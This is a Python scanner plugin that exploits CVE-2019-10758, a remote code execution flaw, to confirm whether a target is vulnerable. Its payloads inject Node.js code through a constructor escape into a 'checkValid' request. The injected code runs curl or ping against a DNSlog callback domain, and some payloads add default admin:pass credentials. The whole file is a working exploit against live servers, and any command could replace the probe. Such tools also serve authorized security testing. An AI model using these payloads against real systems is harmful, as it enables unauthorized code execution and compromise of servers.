#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2019_10758_payloads = [
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSDOMAIN")',
        'headers': {'Authorization': 'Basic YWRtaW46cGFzcw=='}
        
    },
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping -c 4 DNSDOMAIN")',
        'headers': {'Authorization': 'Basic YWRtaW46cGFzcw=='}
    },
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSDOMAIN")',
        'headers': {'Authorization': 'Basic YWRtaW46cGFzcw=='}
    },
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSDOMAIN")',
        'headers': {}
        
    },
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping -c 4 DNSDOMAIN")',
        'headers': {}
    },
    {
        'path': 'checkValid',
        'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSDOMAIN")',
        'headers': {}
    }
]

def cve_2019_10758_scan(self, clients):
    ''' 如果可以成功登录, 或者目标服务器没有修改默认的账号密码(admin:pass), 则可以执行任意node.js代码 '''
    client = clients.get('reqClient')
    sessid = '3d2f0881262d8bd19e65a6ce89229c5e'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2019-10758',
    }

    for payload in cve_2019_10758_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)
        headers = payload['headers']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
